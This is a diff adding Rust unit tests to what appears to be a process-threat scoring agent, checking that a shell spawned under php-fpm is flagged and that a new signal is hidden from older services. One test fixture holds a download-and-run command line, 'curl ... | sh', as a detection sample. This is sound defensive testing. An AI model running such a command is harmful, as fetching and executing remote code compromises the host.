@@ -28,6 +28,18 @@ fn linux(name: &str, path: &str, parent: &str, line: &str) -> View {
 }
 
 #[test]
+fn a_web_server_download_command_counts_when_its_child_shell_has_no_arguments() {
+    let shell = linux("dash", "/usr/bin/dash", "php-fpm8.3", "sh");
+    let ordinary = score_process(&shell, T, &HashMap::new(), &[], ROOT);
+    assert!(containment_reason(&ordinary).is_empty());
+
+    let attack = View { parent_cmdline: Some("php-fpm8.3 -c curl -fsS http://127.0.0.1:18999/p | sh".into()), ..shell };
+    let outcome = score_process(&attack, T, &HashMap::new(), &[], ROOT);
+    assert!(outcome.signals.iter().any(|signal| signal.id == "parent_risky_command_line"));
+    assert!(!containment_reason(&outcome).is_empty());
+}
+
+#[test]
 fn a_shell_under_a_windows_helper_that_starts_none_is_reported_and_its_ordinary_children_are_not() {
     for parent in ["winlogon.exe", "lsass.exe", "ctfmon.exe", "WerFault.exe"] {
         let (level, signals) = judged(&windows("cmd.exe", parent, "cmd.exe"));
@@ -126,6 +138,10 @@ fn a_newer_agent_keeps_back_what_an_older_service_does_not_know() {
     assert_eq!(kept["signals"].as_array().unwrap().len(), 2);
     let plain = json!({"key": "k", "score": 5, "signals": [signal("risky_command_line", 3, "lineage"), signal("fresh_file", 2, "identity")]});
     assert_eq!(known_to(plain.clone(), 1), Some(plain));
+    let web_shell = json!({"key": "k", "score": 6, "categories": ["lineage"],
+        "signals": [signal("shell_from_web_server", 3, "lineage"), signal("parent_risky_command_line", 3, "lineage")]});
+    assert_eq!(known_to(web_shell.clone(), 7), Some(web_shell.clone()));
+    assert_eq!(known_to(web_shell, 6), None);
 }
 
 #[derive(Default)]
